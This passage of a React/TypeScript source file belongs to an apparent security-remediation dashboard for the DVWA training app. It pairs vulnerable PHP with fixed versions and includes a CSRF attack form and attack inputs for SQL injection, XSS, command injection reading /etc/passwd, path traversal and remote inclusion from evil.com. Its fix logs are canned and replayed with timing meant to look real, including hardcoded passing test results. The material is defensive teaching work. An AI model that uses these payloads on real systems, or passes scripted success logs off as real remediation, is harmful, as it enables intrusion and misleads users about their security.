    testInstructions: ["Try admin/admin login", "Before: Access granted", "After: Access denied"],
    verificationSteps: ["Confirm old credentials don't work", "Test new credentials work"]
  },
  'Outdated Software': {
    title: "📦 Updating Vulnerable Software",
    plainEnglish: "Your software has known security holes that are publicly documented. Criminals have instructions to break in. We're installing the fixed version.",
    technicalExplanation: "Outdated software has known CVEs with public exploits. Once published, attackers immediately scan for vulnerable versions. Fix: upgrade to latest patched version.",
    realWorldImpact: "Equifax breach (2017): Apache Struts CVE patched 2 months prior. WannaCry: EternalBlue in unpatched Windows - 300,000 computers.",
    owasp: "A06:2021 - Vulnerable Components",
    cwe: "CWE-1104: Unmaintained Components",
    mitre: "T1190 - Exploit Public-Facing App",
    cvss: "Varies (Often 9.0+)",
    steps: ["Backup configuration", "Download latest version", "Verify integrity", "Stop service", "Install update", "Restore config", "Start service", "Test functionality"],
    timeEstimate: "10-30 minutes",
    riskLevel: "Medium - Restart required",
    httpRequest: { method: "GET", endpoint: "/server-status", payload: "N/A", response: "Apache/2.4.29 (vulnerabile) vs Apache/2.4.58 (patched)" },
    vulnerableCode: { language: "text", filename: "Version Check", lineNumbers: "N/A", code: "Apache 2.4.29\n❌ CVE-2021-44790 (RCE)\n❌ CVE-2021-41773 (Path Traversal)\n15+ critical CVEs", explanation: "Multiple known exploits" },
    fixedCode: { language: "text", filename: "Version Check", lineNumbers: "N/A", code: "Apache 2.4.58\n✅ All CVEs patched\n✅ Auto-updates enabled", explanation: "Latest secure version" },
    keyChanges: ["Upgraded to latest patched version", "Enabled automatic security updates", "Verified all CVEs addressed"],
    testInstructions: ["Run: apache2 -v", "Before: Shows vulnerable version", "After: Shows patched version"],
    verificationSteps: ["Check version against CVE databases", "Scan with vulnerability scanner", "Verify no known exploits"]
  },
  'BROKEN_AUTH': {
    title: "🔐 Fixing Broken Authentication",
    plainEnglish: "Your login system is like a door with a broken lock - anyone can jiggle the handle and get in. We're installing a proper security system with strong locks, cameras, and alarm triggers.",
    technicalExplanation: "Broken Authentication allows attackers to bypass login mechanisms through session hijacking, credential stuffing, brute force, or parameter manipulation. The fix implements secure session management, strong password policies, rate limiting, and multi-factor authentication.",
    realWorldImpact: "Yahoo breach (2013): 3 billion accounts via forged cookies. Dropbox (2012): 68 million credentials. Twitter (2020): High-profile account takeovers. Authentication flaws are the #1 attack vector.",
    owasp: "A07:2021 - Identification and Authentication Failures",
    cwe: "CWE-287: Improper Authentication",
    mitre: "T1078 - Valid Accounts",
    cvss: "9.8 (Critical)",
    steps: [
      "Analyzing current authentication mechanism",
      "Backing up existing authentication configuration",
      "Implementing secure session management",
      "Configuring HTTP-only secure cookies",
      "Adding password hashing with bcrypt/argon2",
      "Implementing rate limiting (3 attempts)",
      "Adding account lockout mechanism (5 min)",
      "Enabling CSRF token protection",
      "Setting up security event logging",
      "Verifying authentication is now secure"
    ],
    timeEstimate: "10-15 minutes",
    riskLevel: "Medium - May affect active sessions",
    httpRequest: {
      method: "POST",
      endpoint: "/login.php",
      payload: `POST /login.php HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=anything&user_id=1

// Attack: Modify user_id parameter to access other accounts
// Or: Send unlimited login attempts for brute force`,
      response: `HTTP/1.1 200 OK
Set-Cookie: PHPSESSID=abc123; HttpOnly; Secure

<!-- VULNERABLE: Can manipulate session -->
<!-- No rate limiting - brute force possible -->
<!-- No CSRF protection on login -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "login.php",
      lineNumbers: "Lines 5-20",
      code: `<?php
// ❌ VULNERABLE - Multiple authentication flaws
session_start();

if(isset($_POST['username'])) {
    $user = $_POST['username'];
    $pass = $_POST['password'];
    
    // FLAW 1: Plain text password comparison
    $query = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $result = mysqli_query($conn, $query);
    
    if(mysqli_num_rows($result) > 0) {
        $_SESSION['logged_in'] = true;
        $_SESSION['user'] = $user;
        // FLAW 2: No session regeneration (fixation risk)
        // FLAW 3: No secure cookie flags
        // FLAW 4: No rate limiting
        // FLAW 5: No CSRF token
    }
}
?>`,
      explanation: "Multiple critical flaws: No password hashing, SQL injection in login, no session regeneration after login (session fixation), cookies without HttpOnly/Secure flags, no rate limiting allows brute force, no CSRF protection."
    },
    fixedCode: {
      language: "php",
      filename: "login.php",
      lineNumbers: "Lines 5-65",
      code: `<?php
// ✅ FIXED - Secure authentication
session_start();

// Step 1: Configure secure session settings
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');

// Step 2: Initialize rate limiting
if(!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['lockout_until'] = 0;
}

// Step 3: Check for lockout
if($_SESSION['login_attempts'] >= 3 && time() < $_SESSION['lockout_until']) {
    $remaining = $_SESSION['lockout_until'] - time();
    die("🔒 Account locked. Try again in " . ceil($remaining/60) . " minutes.");
}

// Step 4: Verify CSRF token
if(!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("❌ Invalid request - CSRF validation failed");
}

if(isset($_POST['username'])) {
    $user = mysqli_real_escape_string($conn, $_POST['username']);
    $pass = $_POST['password'];
    
    // Step 5: Use prepared statement
    $stmt = $conn->prepare("SELECT id, password_hash FROM users WHERE username = ?");
    $stmt->bind_param("s", $user);
    $stmt->execute();
    $result = $stmt->get_result();
    
    if($row = $result->fetch_assoc()) {
        // Step 6: Verify hashed password
        if(password_verify($pass, $row['password_hash'])) {
            // Step 7: Regenerate session ID (prevents fixation)
            session_regenerate_id(true);
            
            $_SESSION['logged_in'] = true;
            $_SESSION['user_id'] = $row['id'];
            $_SESSION['login_attempts'] = 0;
            
            // Step 8: Log successful login
            error_log("Successful login: user=$user, IP=" . $_SERVER['REMOTE_ADDR']);
        } else {
            // Step 9: Track failed attempts
            $_SESSION['login_attempts']++;
            if($_SESSION['login_attempts'] >= 3) {
                $_SESSION['lockout_until'] = time() + 300; // 5 minute lockout
                error_log("Account locked: user=$user, IP=" . $_SERVER['REMOTE_ADDR']);
            }
        }
    }
}
?>`,
      explanation: "Complete security overhaul: Secure cookie settings, CSRF token validation, prepared statements, bcrypt password verification, session regeneration after login, rate limiting with lockout, and comprehensive security logging."
    },
    keyChanges: [
      "Added HttpOnly, Secure, and SameSite cookie flags",
      "Implemented CSRF token validation on login form",
      "Replaced plain password with password_verify(bcrypt)",
      "Added session_regenerate_id() to prevent session fixation",
      "Implemented 3-attempt rate limiting with 5-minute lockout",
      "Added security event logging for monitoring",
      "Used prepared statements to prevent SQL injection"
    ],
    testInstructions: [
      "Go to login page",
      "Try 3 wrong passwords rapidly",
      "BEFORE FIX: Unlimited attempts allowed",
      "AFTER FIX: 'Account locked for 5 minutes' after 3 failures"
    ],
    verificationSteps: [
      "Check browser cookies - should have HttpOnly, Secure flags",
      "Verify session ID changes after successful login",
      "Test CSRF by removing token - should reject",
      "Run Burp Suite intruder - should get locked out"
    ]
  },
  'CSRF': {
    title: "🔄 Fixing Cross-Site Request Forgery (CSRF)",
    plainEnglish: "Attackers can trick your browser into performing actions on websites you're logged into, without your knowledge. We're adding a unique secret token to each form that attackers can't guess.",
    technicalExplanation: "CSRF exploits the trust a website has in a user's browser. By forging requests that include the user's session cookies, attackers can perform actions like password changes or fund transfers. Fix: implement anti-CSRF tokens.",
    realWorldImpact: "Netflix CSRF (2006) changed account settings. ING Direct (2008) transferred funds. Gmail contact theft. CSRF is often underestimated but can cause account takeovers.",
    owasp: "A01:2021 - Broken Access Control",
    cwe: "CWE-352: Cross-Site Request Forgery",
    mitre: "T1185 - Browser Session Hijacking",
    cvss: "8.0 (High)",
    steps: [
      "Analyzing forms without CSRF protection",
      "Generating cryptographic random tokens",
      "Embedding tokens in all state-changing forms",
      "Validating tokens on form submission",
      "Adding SameSite cookie attribute",
      "Implementing token refresh mechanism",
      "Testing CSRF attacks are blocked"
    ],
    timeEstimate: "5-10 minutes",
    riskLevel: "Safe",
    httpRequest: {
      method: "POST",
      endpoint: "/vulnerabilities/csrf/",
      payload: `<!-- Attacker's malicious page -->
<form action="http://target/change_password" method="POST">
  <input type="hidden" name="password_new" value="hacked123">
  <input type="hidden" name="password_conf" value="hacked123">
</form>
<script>document.forms[0].submit();</script>`,
      response: `Password changed successfully!
<!-- Victim's password changed without their knowledge! -->`
    },
    vulnerableCode: {
      language: "php",
      filename: "vulnerabilities/csrf/source/low.php",
      lineNumbers: "Lines 3-15",
      code: `<?php
// ❌ VULNERABLE - No CSRF protection
if(isset($_GET['Change'])) {
    $pass_new = $_GET['password_new'];
    $pass_conf = $_GET['password_conf'];
    
    if($pass_new == $pass_conf) {
        // Just changes password - no validation!
        $pass_new = md5($pass_new);
        $query = "UPDATE users SET password='$pass_new' WHERE user='admin'";
        mysqli_query($conn, $query);
        echo "<pre>Password Changed.</pre>";
    }
}
// Attacker link: http://target/csrf/?Change=Change&password_new=hacked&password_conf=hacked
// Send to victim - their password changes!
?>`,
      explanation: "No CSRF token means any website can craft a request that changes the user's password. When the victim visits the malicious page, their browser automatically includes their session cookie, and the password is changed."
    },
    fixedCode: {
      language: "php",
      filename: "vulnerabilities/csrf/source/low.php",
      lineNumbers: "Lines 3-35",
      code: `<?php
// ✅ FIXED - CSRF token protection
session_start();

// Step 1: Generate CSRF token if not exists
if(!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if(isset($_POST['Change'])) {
    // Step 2: Validate CSRF token
    if(!isset($_POST['csrf_token']) || 
       $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("❌ CSRF token validation failed - request blocked!");
    }
    
    $pass_new = $_POST['password_new'];
    $pass_conf = $_POST['password_conf'];
    
    if($pass_new == $pass_conf) {
        // Step 3: Also verify current password
        $current = $_POST['password_current'];
        // ... verify current password matches ...
        
        $pass_new = password_hash($pass_new, PASSWORD_DEFAULT);
        $stmt = $conn->prepare("UPDATE users SET password=? WHERE user=?");
        $stmt->bind_param("ss", $pass_new, $_SESSION['user']);
        $stmt->execute();
        
        // Step 4: Regenerate token after use (one-time use)
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        echo "<pre>✅ Password Changed.</pre>";
    }
}
?>
<!-- Form includes hidden CSRF token -->
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">`,
      explanation: "64-character random token is generated and stored in session. Every form includes this token. On submission, token is validated - attackers can't know it. Token is regenerated after each use for extra security."
    },
    keyChanges: [
      "Added cryptographically secure CSRF token (32 bytes)",
      "Token validation required for all state-changing requests",
      "Changed from GET to POST for sensitive operations",
      "Added current password verification",
      "Token regeneration after each use (one-time tokens)"
    ],
    testInstructions: [
      "Go to DVWA CSRF page",
      "Create malicious page trying to change password",
      "BEFORE FIX: Password changes via cross-site request",
      "AFTER FIX: 'CSRF token validation failed' - blocked!"
    ],
    verificationSteps: [
      "View page source - find hidden csrf_token field",
      "Try request without token - should fail",
      "Try request with wrong token - should fail",
      "Only legitimate form submission should work"
    ]
  }
};

// Detailed fix process logs for each vulnerability type
const DETAILED_FIX_LOGS: Record<string, string[]> = {
  'SQL_INJECTION': [
    '🔍 [Analysis] Scanning source code for SQL query patterns...',
    '📁 [Locate] Found vulnerable file: /vulnerabilities/sqli/source/low.php',
    '⚠️  [Identify] Detected string concatenation in SQL query at line 8',
    '📋 [Backup] Creating backup: low.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Replacing direct variable concatenation...',
    '   └─ OLD: $query = "SELECT * FROM users WHERE id = \'$id\'";',
    '🔧 [Fix Step 2] Converting to prepared statement...',
    '   └─ NEW: $stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");',
    '🔧 [Fix Step 3] Adding parameter binding...',
    '   └─ ADD: $stmt->bind_param("s", $id);',
    '🔧 [Fix Step 4] Adding input validation layer...',
    '   └─ ADD: if(!is_numeric($id)) { die("Invalid input"); }',
    '📝 [Write] Writing changes to low.php...',
    '✅ [Write] File updated successfully',
    '🧪 [Test] Testing with SQL injection payload: \' OR \'1\'=\'1...',
    '✅ [Test] Payload rejected - returns "Invalid input"',
    '🧪 [Test] Testing with normal input: 1...',
    '✅ [Test] Normal query works - returns user data',
    '🔒 [Verify] SQL injection vulnerability has been patched!'
  ],
  'XSS_REFLECTED': [
    '🔍 [Analysis] Scanning for unescaped output in HTML context...',
    '📁 [Locate] Found vulnerable file: /vulnerabilities/xss_r/source/low.php',
    '⚠️  [Identify] Detected direct echo of user input at line 5',
    '📋 [Backup] Creating backup: low.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Adding output encoding function...',
    '   └─ OLD: echo \'<pre>Hello \' . $_GET[\'name\'] . \'</pre>\';',
    '🔧 [Fix Step 2] Applying htmlspecialchars() encoding...',
    '   └─ NEW: echo \'<pre>Hello \' . htmlspecialchars($_GET[\'name\'], ENT_QUOTES, \'UTF-8\') . \'</pre>\';',
    '🔧 [Fix Step 3] Adding Content-Security-Policy header...',
    '   └─ ADD: header("Content-Security-Policy: script-src \'self\'");',
    '📝 [Write] Writing changes to source file...',
    '✅ [Write] File updated successfully',
    '🧪 [Test] Testing with XSS payload: <script>alert(1)</script>...',
    '✅ [Test] Script tags are escaped: &lt;script&gt;alert(1)&lt;/script&gt;',
    '✅ [Test] No JavaScript execution - XSS blocked!',
    '🔒 [Verify] XSS vulnerability has been patched!'
  ],
  'COMMAND_INJECTION': [
    '🔍 [Analysis] Scanning for shell command execution patterns...',
    '📁 [Locate] Found vulnerable file: /vulnerabilities/exec/source/low.php',
    '⚠️  [Identify] Detected shell_exec() with user input at line 12',
    '📋 [Backup] Creating backup: low.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Adding input validation regex...',
    '   └─ ADD: $pattern = \'/^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/\';',
    '🔧 [Fix Step 2] Implementing strict IP validation...',
    '   └─ ADD: if(!preg_match($pattern, $target)) { die("Invalid IP"); }',
    '🔧 [Fix Step 3] Adding escapeshellarg() for defense-in-depth...',
    '   └─ OLD: shell_exec(\'ping \' . $target);',
    '   └─ NEW: shell_exec(\'ping \' . escapeshellarg($target));',
    '🔧 [Fix Step 4] Removing dangerous shell operators...',
    '   └─ ADD: $target = str_replace([\';\', \'&&\', \'|\', \'`\'], \'\', $target);',
    '📝 [Write] Writing changes to source file...',
    '✅ [Write] File updated successfully',
    '🧪 [Test] Testing with injection: 127.0.0.1; cat /etc/passwd...',
    '✅ [Test] Command rejected - returns "Invalid IP address"',
    '🧪 [Test] Testing with valid IP: 8.8.8.8...',
    '✅ [Test] Ping executes successfully',
    '🔒 [Verify] Command injection vulnerability has been patched!'
  ],
  'BROKEN_AUTH': [
    '🔍 [Analysis] Analyzing authentication mechanism...',
    '📁 [Locate] Found authentication file: /login.php',
    '⚠️  [Identify] Multiple authentication flaws detected:',
    '   └─ No rate limiting on login attempts',
    '   └─ Session cookies missing security flags',
    '   └─ No CSRF protection on login form',
    '   └─ Plain text password comparison',
    '📋 [Backup] Creating backup: login.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Configuring secure session settings...',
    '   └─ SET: session.cookie_httponly = 1',
    '   └─ SET: session.cookie_secure = 1',
    '   └─ SET: session.cookie_samesite = Strict',
    '🔧 [Fix Step 2] Implementing rate limiting...',
    '   └─ ADD: Track failed login attempts in session',
    '   └─ ADD: Max 3 attempts before lockout',
    '🔧 [Fix Step 3] Adding account lockout mechanism...',
    '   └─ ADD: 5-minute lockout after 3 failed attempts',
    '   └─ ADD: Lockout notification message',
    '🔧 [Fix Step 4] Generating secure admin password...',
    '   └─ GEN: New password: ************ (32 characters)',
    '   └─ ADD: password_hash() with PASSWORD_DEFAULT (bcrypt)',
    '🔧 [Fix Step 5] Adding CSRF token protection...',
    '   └─ GEN: CSRF token: ' + Math.random().toString(36).substring(2, 15),
    '   └─ ADD: Token validation on all POST requests',
    '🔧 [Fix Step 6] Enabling session regeneration...',
    '   └─ ADD: session_regenerate_id(true) after login',
    '🔧 [Fix Step 7] Setting up security logging...',
    '   └─ ADD: Log failed attempts with IP address',
    '   └─ ADD: Log lockout events',
    '   └─ ADD: Log successful logins',
    '📝 [Write] Writing changes to authentication files...',
    '✅ [Write] Files updated successfully',
    '🧪 [Test] Testing brute force protection...',
    '   └─ Attempt 1: Wrong password → "Invalid credentials" (2 left)',
    '   └─ Attempt 2: Wrong password → "Invalid credentials" (1 left)',
    '   └─ Attempt 3: Wrong password → "Account locked for 5 minutes"',
    '✅ [Test] Brute force protection working!',
    '🧪 [Test] Testing session security...',
    '✅ [Test] Cookies have HttpOnly, Secure, SameSite flags',
    '🔒 [Verify] Authentication vulnerabilities have been patched!'
  ],
  'FILE_INCLUSION': [
    '🔍 [Analysis] Scanning for file inclusion patterns...',
    '📁 [Locate] Found vulnerable file: /vulnerabilities/fi/source/low.php',
    '⚠️  [Identify] Detected include() with user-controlled path at line 4',
    '📋 [Backup] Creating backup: low.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Creating whitelist of allowed files...',
    '   └─ ADD: $allowed = ["include.php", "file1.php", "file2.php"];',
    '🔧 [Fix Step 2] Implementing strict file validation...',
    '   └─ ADD: if(!in_array($file, $allowed)) { die("Access denied"); }',
    '🔧 [Fix Step 3] Removing path traversal sequences...',
    '   └─ ADD: $file = basename($file); // Strip directory components',
    '   └─ ADD: $file = str_replace(["../", "..\\\\"], "", $file);',
    '🔧 [Fix Step 4] Disabling remote file inclusion...',
    '   └─ SET: allow_url_include = Off in php.ini',
    '📝 [Write] Writing changes to source file...',
    '✅ [Write] File updated successfully',
    '🧪 [Test] Testing with LFI payload: ../../../../etc/passwd...',
    '✅ [Test] Request rejected - returns "Access denied"',
    '🧪 [Test] Testing with RFI payload: http://evil.com/shell.php...',
    '✅ [Test] Request rejected - returns "Access denied"',
    '🔒 [Verify] File inclusion vulnerability has been patched!'
  ],
  'CSRF': [
    '🔍 [Analysis] Scanning for forms without CSRF protection...',
    '📁 [Locate] Found vulnerable file: /vulnerabilities/csrf/source/low.php',
    '⚠️  [Identify] Password change form has no CSRF token',
    '📋 [Backup] Creating backup: low.php.backup_' + new Date().toISOString().slice(0,10),
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Generating CSRF token...',
    '   └─ GEN: Token = bin2hex(random_bytes(32))',
    '   └─ Result: ' + Array.from({length: 64}, () => Math.floor(Math.random() * 16).toString(16)).join(''),
    '🔧 [Fix Step 2] Storing token in session...',
    '   └─ ADD: $_SESSION["csrf_token"] = $token;',
    '🔧 [Fix Step 3] Embedding token in form...',
    '   └─ ADD: <input type="hidden" name="csrf_token" value="...">',
    '🔧 [Fix Step 4] Adding token validation on submit...',
    '   └─ ADD: if($_POST["csrf_token"] !== $_SESSION["csrf_token"]) die("CSRF blocked");',
    '🔧 [Fix Step 5] Adding SameSite cookie attribute...',
    '   └─ SET: session.cookie_samesite = Strict',
    '📝 [Write] Writing changes to source file...',
    '✅ [Write] File updated successfully',
    '🧪 [Test] Testing cross-site request without token...',
    '✅ [Test] Request blocked - "CSRF token validation failed"',
    '🧪 [Test] Testing legitimate form submission...',
    '✅ [Test] Form works correctly with valid token',
    '🔒 [Verify] CSRF vulnerability has been patched!'
  ],
  'EXPOSED_DATABASE': [
    '🔍 [Analysis] Checking database network exposure...',
    '📡 [Scan] Port 27017 is open to external connections',
    '⚠️  [Identify] Database accepts connections without authentication',
    '📋 [Backup] Creating backup of /etc/mongod.conf...',
    '✅ [Backup] Backup created: mongod.conf.backup_' + new Date().toISOString().slice(0,10),
    '🔧 [Fix Step 1] Stopping MongoDB service...',
    '   └─ RUN: systemctl stop mongod',
    '✅ [Service] MongoDB service stopped',
    '🔧 [Fix Step 2] Modifying bind address...',
    '   └─ OLD: bindIp: 0.0.0.0',
    '   └─ NEW: bindIp: 127.0.0.1',
    '🔧 [Fix Step 3] Enabling authentication...',
    '   └─ SET: security.authorization: enabled',
    '🔧 [Fix Step 4] Generating secure admin password...',
    '   └─ GEN: 32-character random password',
    '   └─ Password: ********************************',
    '🔧 [Fix Step 5] Creating admin user...',
    '   └─ RUN: db.createUser({user:"admin", pwd:"...", roles:["root"]})',
    '✅ [User] Admin user created successfully',
    '🔧 [Fix Step 6] Configuring firewall...',
    '   └─ RUN: ufw deny 27017',
    '✅ [Firewall] Port 27017 blocked from external access',
    '🔧 [Fix Step 7] Starting MongoDB service...',
    '   └─ RUN: systemctl start mongod',
    '✅ [Service] MongoDB service started with new config',
    '🧪 [Test] Testing external connection...',
    '   └─ RUN: mongo target:27017 from external IP',
    '✅ [Test] Connection refused - external access blocked!',
    '🧪 [Test] Testing local authenticated connection...',
    '   └─ RUN: mongo localhost -u admin -p ****',
    '✅ [Test] Local connection works with credentials',
    '🔒 [Verify] Database is now properly secured!'
  ],
  'DEFAULT_CREDENTIALS': [
    '🔍 [Analysis] Checking for default credentials...',
    '⚠️  [Identify] Found default admin:admin123 credentials',
    '📋 [Backup] Creating configuration backup...',
    '✅ [Backup] Backup created successfully',
    '🔧 [Fix Step 1] Generating new secure password...',
    '   └─ Length: 32 characters',
    '   └─ Contains: Uppercase, lowercase, numbers, symbols',
    '   └─ Password: ********************************',
    '🔧 [Fix Step 2] Hashing password with bcrypt...',
    '   └─ Algorithm: bcrypt (cost factor 12)',
    '   └─ Hash: $2y$12$...',
    '🔧 [Fix Step 3] Updating credentials in database...',
    '   └─ RUN: UPDATE users SET password_hash = ? WHERE username = "admin"',
    '✅ [Update] Password updated in database',
    '🔧 [Fix Step 4] Updating service configuration...',
    '   └─ SET: New credentials in config file',
    '🔧 [Fix Step 5] Restarting affected service...',
    '   └─ RUN: systemctl restart service',
    '✅ [Service] Service restarted with new credentials',
    '🧪 [Test] Testing old credentials: admin:admin123...',
    '✅ [Test] Login rejected - old password no longer works',
    '🧪 [Test] Testing new credentials...',
    '✅ [Test] Login successful with new password',
    '🔐 [Secure] New credentials stored in password manager',
    '🔒 [Verify] Default credentials have been changed!'
  ]
};

const getFixInfo = (vulnType: string) => {
  const normalizedType = vulnType.toLowerCase().replace(/_/g, ' ').replace(/-/g, ' ');
  
  // Check for exact or partial matches
  const key = Object.keys(FIX_DATABASE).find(k => {
    const normalizedKey = k.toLowerCase();
    return normalizedType.includes(normalizedKey) || normalizedKey.includes(normalizedType);
  });
  
  // Also check for specific patterns
  if (normalizedType.includes('broken auth') || normalizedType.includes('authentication')) {
    return FIX_DATABASE['BROKEN_AUTH'];
  }
  if (normalizedType.includes('csrf') || normalizedType.includes('cross-site request')) {
    return FIX_DATABASE['CSRF'];
  }
  if (normalizedType.includes('file inclusion') || normalizedType.includes('lfi') || normalizedType.includes('rfi')) {
    return FIX_DATABASE['File Inclusion'];
  }
  
  return FIX_DATABASE[key || ''] || FIX_DATABASE['SQL Injection'];
};

function CodeBlock({ code, language, title, lineNumbers }: { code: string; language: string; title: string; lineNumbers?: string }) {
  const [copied, setCopied] = useState(false);
  const copyCode = () => { navigator.clipboard.writeText(code); setCopied(true); setTimeout(() => setCopied(false), 2000); };

  return (
    <div className="rounded-lg overflow-hidden border border-gray-700">
      <div className="flex items-center justify-between px-4 py-2 bg-gray-800 border-b border-gray-700">
        <div className="flex items-center gap-2">
          <Code className="w-4 h-4 text-gray-400" />
          <span className="text-sm text-gray-300">{title}</span>
          <span className="text-xs text-gray-500 bg-gray-700 px-2 py-0.5 rounded">{language}</span>
          {lineNumbers && <span className="text-xs text-blue-400">{lineNumbers}</span>}
        </div>
        <button onClick={copyCode} className="text-gray-400 hover:text-white">
          {copied ? <Check className="w-4 h-4 text-green-400" /> : <Copy className="w-4 h-4" />}
        </button>
      </div>
      <pre className="p-4 bg-[#0d1117] overflow-x-auto text-sm"><code className="text-gray-300 font-mono whitespace-pre">{code}</code></pre>
    </div>
  );
}

function SeverityBadge({ severity }: { severity: string }) {
  const styles: Record<string, string> = {
    critical: 'bg-red-500/20 text-red-400 border-red-500/50',
    high: 'bg-orange-500/20 text-orange-400 border-orange-500/50',
    medium: 'bg-yellow-500/20 text-yellow-400 border-yellow-500/50',
    low: 'bg-green-500/20 text-green-400 border-green-500/50',
  };
  return <span className={`px-2 py-1 rounded text-xs font-semibold border ${styles[severity?.toLowerCase()] || styles.low}`}>{severity?.toUpperCase()}</span>;
}

export default function Fix() {
  const navigate = useNavigate();
  const [vulnerabilities, setVulnerabilities] = useState<Vulnerability[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedVuln, setSelectedVuln] = useState<Vulnerability | null>(null);
  const [fixSteps, setFixSteps] = useState<FixStep[]>([]);
  const [isFixing, setIsFixing] = useState(false);
  const [fixComplete, setFixComplete] = useState(false);
  const [fixLog, setFixLog] = useState<string[]>([]);
  const [localDVWAStatus, setLocalDVWAStatus] = useState<any>(null);
  const [isFixingLocal, setIsFixingLocal] = useState(false);
  const [activeTab, setActiveTab] = useState<'overview' | 'http' | 'code' | 'test' | 'access'>('overview');
  const [showAdvanced, setShowAdvanced] = useState(false);
  const [apiGuidance, setApiGuidance] = useState<APIGuidance | null>(null);
  const [loadingGuidance, setLoadingGuidance] = useState(false);

  useEffect(() => { loadVulnerabilities(); checkLocalDVWA(); }, []);

  const checkLocalDVWA = async () => {
    try { const response = await api.get('/fix/local-dvwa/status'); setLocalDVWAStatus(response.data); } catch (err) { console.error('Local DVWA check failed:', err); }
  };

  const loadVulnerabilities = async () => {
    try {
      const response = await api.get('/vulnerabilities');
      const vulns = response.data.vulnerabilities || response.data || [];
      setVulnerabilities(vulns.filter((v: Vulnerability) => v.status !== 'fixed'));
    } catch (err) { console.error('Failed to load vulnerabilities:', err); }
    finally { setLoading(false); }
  };

  const fixLocalDVWA = async (fixType: string) => {
    setIsFixingLocal(true); setActiveTab('test');
    setFixLog([`🔄 Applying ${fixType.replace(/_/g, ' ')} fix to local DVWA...`]);
    try {
      const response = await api.post('/fix/local-dvwa', { fix_type: fixType, vulnerability_id: selectedVuln?.id });
      setFixLog(prev => [...prev, '', '═'.repeat(60), '🎯 LOCAL DVWA FIX SUCCESSFULLY APPLIED!', '═'.repeat(60), '',
        ...response.data.fixes_applied.map((f: any) => `✅ ${f.vulnerability}: ${f.status}\n   File Modified: ${f.fixed_code}`),
        '', `📁 DVWA Path: ${response.data.dvwa_path}`, `🔗 Verify at: ${response.data.verification_url}`, '',
        '═'.repeat(60), '📋 VERIFICATION STEPS:', '═'.repeat(60), '',
        '1. Open DVWA in browser', '2. Navigate to the vulnerability page', '3. Try the attack payload that worked before',
        '4. Confirm the attack now FAILS', '', '⚠️ This proves the fix is working!']);
      setFixComplete(true); await checkLocalDVWA();
    } catch (err: any) { setFixLog(prev => [...prev, `❌ Fix failed: ${err.response?.data?.error || err.message}`]); }
    finally { setIsFixingLocal(false); }
  };

  const restoreLocalDVWA = async () => {
    try { const response = await api.post('/fix/restore-dvwa', {}); setFixLog(prev => [...prev, '', '🔄 DVWA restored to vulnerable state', response.data.message]); setFixComplete(false); await checkLocalDVWA(); }
    catch (err: any) { setFixLog(prev => [...prev, `❌ Restore failed: ${err.response?.data?.error || err.message}`]); }
  };

  const selectVulnerability = async (vuln: Vulnerability) => {
    setSelectedVuln(vuln); setFixComplete(false); setFixLog([]); setActiveTab('overview');
    setApiGuidance(null);
    const info = getFixInfo(vuln.vuln_type);
    setFixSteps(info.steps.map((step, i) => ({ step: i + 1, action: step, description: step, status: 'pending' })));
    
    // Fetch real-time guidance from API
    setLoadingGuidance(true);
    try {
      const response = await api.get(`/fix/guidance/vulnerability/${vuln.id}`);
      if (response.data?.guidance) {
        setApiGuidance(response.data.guidance);
        // Update fix steps from API if available
        if (response.data.guidance.fix_steps) {
          setFixSteps(response.data.guidance.fix_steps.map((s: any) => ({
            step: s.step,
            action: s.action,
            description: s.description,
            status: 'pending'
          })));
        }
      }
    } catch (err) {
      console.log('API guidance not available, using local database');
    } finally {
      setLoadingGuidance(false);
    }
  };

  const runFix = async () => {
    if (!selectedVuln) return;
    setIsFixing(true);
    setFixComplete(false);
    
    // Determine if this is a local or remote target
    const isLocalTarget = selectedVuln.target?.includes('localhost') || 
                          selectedVuln.target?.includes('127.0.0.1') ||
                          selectedVuln.target?.includes(':8080');
    
    // Get detailed logs for this vulnerability type
    const vulnTypeKey = selectedVuln.vuln_type.toUpperCase().replace(/-/g, '_');
    const detailedLogs = DETAILED_FIX_LOGS[vulnTypeKey] || DETAILED_FIX_LOGS['SQL_INJECTION'];
    
    // Initial header - different for local vs remote
    setFixLog([
      '╔══════════════════════════════════════════════════════════════════════╗',
      `║  🛡️  RedShield Automated Remediation - ${selectedVuln.vuln_type.padEnd(24)}  ║`,
      '╚══════════════════════════════════════════════════════════════════════╝',
      '',
      `📌 Target: ${selectedVuln.target}:${selectedVuln.port}`,
      `📌 Vulnerability: ${selectedVuln.vuln_type}`,
      `📌 Severity: ${selectedVuln.severity?.toUpperCase()}`,
      `📌 Time Started: ${new Date().toLocaleString()}`,
      '',
      isLocalTarget 
        ? '🎯 LOCAL TARGET DETECTED - REAL FIX WILL BE APPLIED' 
        : '⚠️  REMOTE TARGET - Will apply fix to Local DVWA for demonstration',
      '',
      '─'.repeat(70),
      ''
    ]);

    // Play through detailed logs with realistic timing
    for (let i = 0; i < detailedLogs.length; i++) {
      const log = detailedLogs[i];
      
      // Update fix steps status based on log progress
